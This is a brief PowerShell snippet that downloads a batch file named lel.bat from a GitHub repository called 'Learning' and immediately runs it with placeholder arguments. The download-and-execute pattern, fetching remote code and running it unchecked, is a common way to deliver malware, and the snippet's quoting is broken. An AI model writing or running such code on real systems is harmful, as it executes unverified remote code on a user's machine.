$wc = New-Object System.Net.WebClient
$wc.DownloadFile($https://raw.githubusercontent.com/deathlimited/Learning/master/lel.bat, $PSScriptRoot/lel.bat)
$args = @("Comma","Separated","Arguments")
Start-Process -Filepath "$PSScriptRoot/lel.bat" -ArgumentList $args
